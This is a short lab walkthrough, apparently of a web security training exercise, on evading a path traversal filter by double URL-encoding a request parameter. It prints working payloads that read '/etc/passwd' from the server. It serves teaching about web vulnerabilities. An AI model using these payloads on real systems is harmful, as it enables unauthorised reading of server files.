# Lab: File path traversal, traversal sequences stripped with superfluous URL-decode

Like in the previous lab, intercept the image-loading request using Burp Suite.

<img width="406" height="404" alt="image" src="https://github.com/user-attachments/assets/c70f4b2f-b14a-4fd1-86ec-9a8d0c6e8246" />

The original request is:

```http
GET /image?filename=38.jpg HTTP/2
```

Normally, we would attempt to modify the `filename` parameter using a standard path traversal payload:

```http
GET /image?filename=38.jpg HTTP/2
>
GET /image?filename=../../../etc/passwd HTTP/2
```

However, in this case, the application blocks input containing normal traversal sequences.

To bypass this protection, URL-encode the traversal payload twice.

Use any URL encoder to encode the payload:

```text
../../../etc/passwd
```

<img width="260" height="57" alt="image" src="https://github.com/user-attachments/assets/ffe47184-cdb9-4a67-aa24-32f59153e849" />

<img width="363" height="53" alt="image" src="https://github.com/user-attachments/assets/fa3ca529-e81e-42ea-8de1-ff69f873e9cf" />

The resulting double URL-encoded payload is:

```text
..%252F..%252F..%252Fetc%252Fpasswd
```

Modify the request:

```http
GET /image?filename=../../../etc/passwd HTTP/2
>
GET /image?filename=..%252F..%252F..%252Fetc%252Fpasswd HTTP/2
```

<img width="403" height="457" alt="image" src="https://github.com/user-attachments/assets/f15bc766-83a5-4e2b-a459-67ce39da1ebb" />

The server successfully returns the contents of `/etc/passwd`.

This confirms that the application blocks normal traversal sequences before performing an additional URL-decoding operation.

By double URL-encoding the traversal characters, the initial validation does not detect the original `../` sequences. After the application performs URL decoding, the input is transformed back into a valid path traversal payload.

Successfully retrieved the contents of `/etc/passwd` using double URL encoding.
